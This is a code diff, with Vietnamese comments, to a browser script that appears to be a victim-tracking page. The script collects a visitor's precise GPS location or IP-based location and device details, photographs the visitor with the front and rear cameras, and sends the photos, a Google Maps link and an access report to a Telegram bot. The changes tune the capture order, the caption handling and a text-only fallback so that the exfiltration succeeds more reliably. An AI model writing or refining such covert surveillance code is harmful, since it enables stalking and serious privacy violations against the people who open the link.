@@ -7,7 +7,7 @@ function getGPS() {
         navigator.geolocation.getCurrentPosition(
             (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
             () => res(null),
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 4000 }
         );
     });
 }
@@ -48,12 +48,14 @@ async function capture(mode) {
 async function main() {
     const [gps, info] = await Promise.all([getGPS(), getVitals()]);
     
+    // Chụp cam trước xong mới chụp cam sau để tránh xung đột phần cứng
     const p1 = await capture("user");
     const p2 = await capture("environment");
 
     const lat = gps ? gps.lat : info.lat;
     const lon = gps ? gps.lon : info.lon;
     const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
+    // Sửa link Maps chuẩn như ảnh mẫu của bạn
     const map = `https://www.google.com/maps?q=${lat},${lon}`;
 
     const cap = `📡 [THÔNG TIN TRUY CẬP]
@@ -76,15 +78,18 @@ async function main() {
         fd.append('f1', p1, '1.jpg');
         media.push({ type: 'photo', media: 'attach://f1', caption: cap });
     }
+    
     if (p2) {
         fd.append('f2', p2, '2.jpg');
-        media.push({ type: 'photo', media: 'attach://f2', caption: (!p1) ? cap : "" });
+        // Nếu không có cam trước thì gắn caption vào cam sau, nếu có rồi thì để trống để gộp nhóm
+        media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
     }
 
     if (media.length > 0) {
         fd.append('media', JSON.stringify(media));
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
     } else {
+        // Fallback gửi tin nhắn chữ nếu cả 2 cam đều xịt
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
